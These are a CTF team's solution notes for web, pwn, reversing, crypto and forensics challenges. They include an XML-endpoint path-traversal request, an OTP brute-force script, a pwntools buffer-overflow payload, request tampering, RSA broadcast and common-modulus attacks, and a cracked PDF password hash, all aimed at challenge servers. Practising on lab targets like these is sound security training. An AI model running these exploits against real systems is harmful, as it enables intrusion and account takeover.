
### RICK -  WEB

![[Pasted image 20250531001111.png]]

xxe works , retrived /proc/environ . main.py no flags , asked up gpt for possible locations ,

- main.py
```
@auth.route('/data', methods=['POST'])
def process_data():
    # Decode the incoming XML data
    xml_data = request.data.decode('utf-8')
    parser = ET.XMLParser(resolve_entities=True)
    root = ET.fromstring(xml_data, parser=parser)
    try:
        # Parse XML data with lxml, allowing external entity resolution
        # Enable external entity resolution
        # parser = ET.XMLParser(resolve_entities=True)
        #  Parse the XML with XXE vulnerability enabled
        # root = ET.fromstring(xml_data, parser=parser)

        # Extract the user ID from the XML
        user_id = root.find('ID').text
        print(user_id)
        details = open(f'static/details/{user_id.strip()}').read()
    except ET.XMLSyntaxError:
        # If parsing fails, return the raw XML (this simulates error handling)
        details = __import__('os').getcwd()
    except:
        details = f"Current working directory: {__import__('os').getcwd()}"

    response = make_response(details)
    return response
                        
```



```
curl -X POST http://4.240.104.200:5004/data \
-H "Content-Type: application/xml" \
--data '<?xml version="1.0"?><data><ID>../../../../app/.flag</ID></data>'
```



### AGAIN CRYPTO

- used up chatgpt to getit 

```
from Crypto.Cipher import ARC4
import binascii
def xor_bytes(a, b):
    return bytes([x ^ y for x, y in zip(a, b)])
flag_ct_hex = "70cb56bc40d8c59485eb174afa1fc998984de858e6e642d9526ccfda12"
boom_ct_hex = "79de558663ade6ac9bd8353fe46fbf84b33dd928fac331e84e56bcec2c98"
flag_ct = bytes.fromhex(flag_ct_hex)
boom_ct = bytes.fromhex(boom_ct_hex)
boom_pt = b"A" * 14 + b"C" * 16
keystream = xor_bytes(boom_ct, boom_pt)
flag = xor_bytes(flag_ct, keystream)
print("Recovered flag:", flag)
```

### OSINT - King's Crossing
Address : No.67, Kille Mohalla, 1A, Sayyaji Rao Rd, near Agrahara, Agrahara, circle, Mysuru, Karnataka 570004


### WRONG - REV

```
def rc4_init(key):
    arr1 = list(range(256))
    arr2 = 0
    for j in range(256):
        arr2 = (arr2 + arr1[j] + key[j % len(key)]) % 256
        arr1[j], arr1[arr2] = arr1[arr2], arr1[j]
    return arr1

def second_shuffle(arr1):
    local_290 = 0
    local_28c = 0
    for k in range(28):
        local_290 = (local_290 + 1) % 256
        local_28c = (local_28c + arr1[k]) % 256
        arr1[local_290], arr1[local_28c] = arr1[local_28c], arr1[local_290]
    return arr1

def recover_input(arr1, local_278):
    return bytes([local_278[i] ^ arr1[i] for i in range(28)])

key = [0xad, 0xde, 0xde, 0xc0, 0xad, 0xde, 0xde, 0xc0]

local_278 = [
    0x5a, 0xe3, 0xd9, 0x62, 0x22, 0x9f, 0x59, 0xc9,
    0xe2, 0x18, 0xd1, 0x37, 0xe7, 0xf7, 0x3e, 0x66,
    0xea, 0x88, 0x33, 0x44, 0x6c, 0x73, 0x85, 0x16,
    0x5d, 0x6c, 0xef, 0xa3
]

arr1 = rc4_init(key)
arr1 = second_shuffle(arr1)
flag = recover_input(arr1, local_278)

print("Recovered input:", flag.decode(errors="replace"))
```



**Lousy 2FA:**

we check **/robots.txt**
it leads to **/forgot-password**
in **script.js**
```javascript
fetch('/send-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: emailInput.value,
            // length: 8
         }),
    })
```
we then use this to brute-force the smallest otp length supported by the server
```python
import requests

for i in range(100):
    data = {"email":"admin@example.com","otp":"1"}
    data['otp']=str(i)
    r = requests.post("http://4.240.104.200:5003/verify-otp",json=data)
    if("Invalid" not in r.text):print(r.text)
```
**Flag :**  HTB{L3NGTH_D0E5NT_MATT3R_0R_D03S_1T?}

### TIP TOP PWN

```
from pwn import *

elf = context.binary = ELF('./tiptop')
context.terminal = ['kitty', '-e']

gdbscript = '''
b*main
b*magic_menu
'''

if args.REMOTE:
    p = remote('4.240.104.200',6974)
elif args.GDB:
    p = gdb.debug(elf.path, gdbscript=gdbscript)
else:
    p = process(elf.path)

#=======exploit=======#


payload = b'A'*72 + p64(0x0000000000401016) + p64(elf.sym['magiccolour'])

p.recvuntil(b'5. Orange\n')
p.sendline(b'4')
p.sendline(payload)
#p.recvuntil(b'name')
#p.send(payload)

p.interactive()
```


**Tic Tac Toe** -web 
playing the game normally leads to the server replacing our moves and cheating
then we open the **/move_1** in burp and start modifying request to see what it can take
```json
{
    "game_id": "20b3290a-c",
    "row": 0,
    "col": 0,
    "moveNo": 1
}
```

after testing, we can see it accepts negatives and when using negatives the server behaves differently
```json
{
    "game_id": "20b3290a-c",
    "row": -1,
    "col": 0,
    "moveNo": 1
}
```
using this with some trial and error , we get our score upto 3 and then post **/submit_score_3**
to get the flag
**Flag**: HTB{tw000\_g00d\_f0ur\_r34l?\_8784703363}


**Echoes of awa** - crypto
after checking the challenge files and searching online and using it as a base , we solve with
```python
def decrypt_awa(encrypted: str) -> str:
    dec = ""
    for token in encrypted.strip().split(" "):
        d = token.replace("awawawa","1").replace("awa","0")[::-1]
        d = chr(int(d,2))
        dec+=d
    return dec


def brute_force_shifted_flag(shifted_flag):
    for shift in range(128):
        candidate = ''.join(chr((ord(char) - shift) % 128) for char in shifted_flag)
        print(f"Shift {shift}: {candidate}")

ct = "awawawaawaawawawaawawawaawaawaawawawaawa awawawaawaawaawawawaawawawaawaawawawaawa awawawaawawawaawawawaawaawaawaawawawaawa awaawaawaawaawaawaawaawa awawawaawawawaawaawaawawawaawaawawawaawa awawawaawaawawawaawaawawawaawawawaawaawa awaawaawawawaawawawaawawawaawawawaawaawa awaawaawawawaawaawaawawawaawawawaawa awawawaawaawaawawawaawawawaawawawaawaawa awawawaawaawaawaawawawaawawawaawawawaawa awawawaawaawaawaawawawaawawawaawawawaawa awaawaawawawaawaawaawawawaawawawaawa awaawaawaawawawaawaawaawawawaawa awawawaawawawaawawawaawaawawawaawawawaawawawaawa awaawawawaawawawaawawawaawawawaawawawaawawawaawa awawawaawaawawawaawaawawawaawawawaawawawaawa awaawaawawawaawawawaawawawaawawawaawaawa awawawaawaawawawaawaawawawaawawawaawaawa"

ct = decrypt_awa(ct)

print(brute_force_shifted_flag(ct))
```
**Flag**: HTB{N07_4ll_Cryp70_15_UnBr34k4bl3}


### PAIN REVERSE

So basically this challenge involves anti-debugging. Extract main functions and decrypt it.... Then you can analyse it...

There you will get the decryption logic:
```python
expected_stack_values_raw = [
    0x4e, 0x7f, 0x79, 0x7f, 0x10, 0x7e, 0x08, 0x61, 0x7d, 0x1a, 0x33, 0x45, 0x16, 0x7a, 0x51, 0x77,
    0x5f, 0x43, 0x0d, 0x40, 0x37, 0x6b, 0x28, 0x67, 0x35, 0x51, 0x6f, 0x06, 0x46, 0x6e, 0x29, 0x2b,
    0x66
]

K1 = "IDKwhyIamD0ingThis"
K3 = "Oops"
L1 = len(K1)
L3 = len(K3)

flag_length = 33
real_flag_chars = []

for j in range(flag_length):
    e_j = expected_stack_values_raw[j]
    
    k3_char_val = ord(K3[j % L3])
    k1_char_val = ord(K1[j % L1])
        
    temp_j = e_j ^ k3_char_val
    f_j = temp_j ^ k1_char_val
    
    real_flag_chars.append(chr(f_j))

print("".join(real_flag_chars))
```


**Ciao Detective 1**

looking through the pcap file , the http requests are garbage then i find base64 encoded message from a tcp request going to 192.168.13.37 , using tshark ,filtering and exporting their data field to decode in python by 
```bash
tshark -Y "tcp && ip.addr == 192.168.13.37 && !(http)" -T fields -e data -r secret.pcap > out
```
in python now i decode the base64 but some messages do not decode and give error
after searching around and asking chatgpt , i get to know that they are encrypted by 
`cryptography.fernet` ,  and other messages also mention a secret key , going back to pcap file i find a ip with single request , that contained the secret key , i then decrypt and it seems to be png so export them as png
```python
import base64
from cryptography.fernet import Fernet

key = b'SwossJsjDe1x3CqJrht-iKhPWagx1bam6Q5zBI0R4nI='
f = Fernet(key)
i=0
for line in open("out").readlines():
    try:
        if(len(line)<2):continue
        print(base64.b64decode(bytes.fromhex(line)).decode())
    except:
        # print("ERROR:", line)
        try:
            plaintext = f.decrypt(bytes.fromhex(line))
            open("outputs/"+str(i)+".png", "wb").write(base64.b64decode(plaintext))
            i+=1
        except:
            print("error",line)
            pass
        # print(plaintext)
        pass
```

**Flag :** HTB{a1c0hol_i5_bad_f0r_y0u}


### Thala for a reason - Forensics

We Have Thala.ad1

When exporting all files to my local machine , i am able to find these pdfs

all are corrupted except that reason.pdf

`flag1.pdf  flag2.pdf  flag3.pdf  flag5.pdf  flag6.pdf  reason.pdf`

When checking the description again , 

```You Know they say "THALA FOR A REASON". I want you to dive in the files, and get me the reason.```


i can see the hint , `reason` ! but it is password protected 

When enumerating again , i saw another `thala.ad1` 

exporting all files again and this time i found main two filess , one is `flag7.pdf` & another one is `flag.txt`

Inside `flag.txt`

i found the hash : `flag7-protected.pdf:$pdf$4*4*128*-4*1*16*26bf130a2721320b36416d212cfead8b*32*bb481f01ebd346bb61f9e08084c071fd28bf4e5e4e758a4164004e56fffa0108*32*6cb92a42d70885877620e626b05162599ff277538d92968832fe7d1e0e22d4be`

crack it : `iloveyou`

after unzip , we found a qr ! we need to scan to retrieve the flag !


Basically we found two flags , one is from 

`flag7.pdf` :  `HTB{D4Mn_%_N11G433}`

`reason.pdf`: `HTB{y0U_f0U4D_FT13_REASON}`


**A Message From Professor** - misc 

the hint `Rebellion Bleeds through red but not on the surface. Look past the first ripple. The second wave carries the message.` hinted at the Red layer in the image , i go through bit planes but dont find anything but the red layer 2 seems to be a little different , it has a border around the man, i then go try extract data from red layer 2 , and it works
```hexdump
........  ........  ..}!74am  $_$!_40$  $ef04P{B  TH......  ........  
```
**Flag :** ```HTB{P40fe$$04_!$_$ma47!}```

**Rsa 1**: - crypto
the challenge provides n and ct
```
n = 94679407488132818404660699098842374931489424397235444032237590365827255722...
ciphertext = 1dbdc6283a77360ca55b6454af7947e3fc41f7b72884060e48e794331b67f0b16....
```
and `20657865737c737c74`
i try to crack it with default e=65537 used by many ctfs but it gives bad decryption
i try to xor the provided hex with the ct before and after decryption but it doesn't work
then i try playing around with the provided hex by bruteforcing the xor, and find `E` xor results in `e = 69691` (nice).
now cracking with this exponent leads to the flag

**Flag :** ```HTB{rsa_seems_cool_heh}```


 ### Deep Dive -  Forensics

Description : 

```In the world of digital forensics, sometimes the most crucial evidence is not immediately visible. Investigators must delve deep into the file, searching for clues that elude the eye and uncover the truth hidden beneath layers of complexity. As you dig through the data, the challenge is to reveal what lies beneath the surface and piece together the story that has been obscured.```

Attached File : `DeepDive.xlsx`

First thing i checked for macros and changed color of all the cells , to not miss any hidden fields 

Later i did , unzipped the whole excel file 

```┌──(l4tmur㉿NOVA)-[/mnt/…/CTF/csecindia-25/Forensics/deepdive]
└─$ unzip DeepDive.xlsx 
Archive:  DeepDive.xlsx
  inflating: docProps/app.xml        
  inflating: docProps/core.xml       
  inflating: xl/theme/theme1.xml     
  inflating: xl/worksheets/sheet1.xml  
  inflating: xl/worksheets/sheet2.xml  
  inflating: xl/worksheets/sheet3.xml  
  inflating: xl/worksheets/sheet4.xml  
  inflating: xl/styles.xml           
  inflating: _rels/.rels             
  inflating: xl/workbook.xml         
  inflating: xl/_rels/workbook.xml.rels  
  inflating: [Content_Types].xml  ```


When checking the output i can see other 3 sheets which are hidden 

When analysing all the 4 xml files

```┌──(l4tmur㉿NOVA)-[/mnt/…/Forensics/deepdive/xl/worksheets]
└─$ ls
sheet1.xml  sheet2.xml  sheet3.xml  sheet4.xml
```

i can see the hidden fields , started with `UGO{`

Looked sus ! its in the format of `HTB{`

so i checked for all the hidden fields and arranged it in the order 

```
UGO{jul_vg0_9yj9l0_s5e8a0hpx0}
```

After applying ROT 13 ,it decodes to

FLAG :

```HTB{why_it5_4lw4y5_f0r3n5uck5}```


**RSA 2**

for this one we get multiple modulus and ciphertexts which is basis for RSA broadcast attack
we ask chatgpt for help for decryption script and going a little back and forth solve it with 
```python
from Crypto.Util.number import long_to_bytes
from sympy import mod_inverse, integer_nthroot
from functools import reduce

# Given values
n = []#ns..
c = []#cts..
e = 4
# Step 1: Compute the product of all moduli
N = reduce(lambda x, y: x * y, n)
# Step 2: Apply the Chinese Remainder Theorem
def crt(c, n):
    result = 0
    for i in range(len(n)):
        Ni = N // n[i]
        inv = mod_inverse(Ni, n[i])
        result += c[i] * Ni * inv
    return result % N
m4 = crt(c, n)
# Step 3: Take the e-th root of m^e to get m
m, exact = integer_nthroot(m4, e)
if not exact:
    print("Root wasn't exact, but likely correct")

# Step 4: Decode the message
print("Recovered message:", long_to_bytes(m).decode())
```
Flag : HTB{4n0th3r_e45y_p345y_rs4_qs}


**RSA 3**

this chall gives a single modulus , 2 cts and 2 exponents. this seemed like common modulus attack so trying that , we check for gcd of exponents and it is indeed 1 so , i continue the attack with help of chatgpt 

```python
from Crypto.Util.number import inverse, long_to_bytes, bytes_to_long
from math import gcd

n =
c1 =
c2 =
# given values
e1, e2 = 0x1337, 0x1731  
# 1. ensure coprime
assert gcd(e1, e2) == 1
# 2. find s1, s2 with s1*e1 + s2*e2 = 1
def xgcd(a, b):
    if b == 0:
        return (1, 0, a)
    x, y, g = xgcd(b, a % b)
    return (y, x - (a // b) * y, g)
  
s1, s2, _ = xgcd(e1, e2)

# 3. recover m
# handle negative exponents by modular inverse
part1 = pow(c1, s1, n) if s1 >= 0 else pow(inverse(c1, n), -s1, n)
part2 = pow(c2, s2, n) if s2 >= 0 else pow(inverse(c2, n), -s2, n)
m = (part1 * part2) % n
flag = long_to_bytes(m)
print(flag)
```

Flag : ```HTB{c0mm0n_m0du1u5_4774ck_1337_1731}```

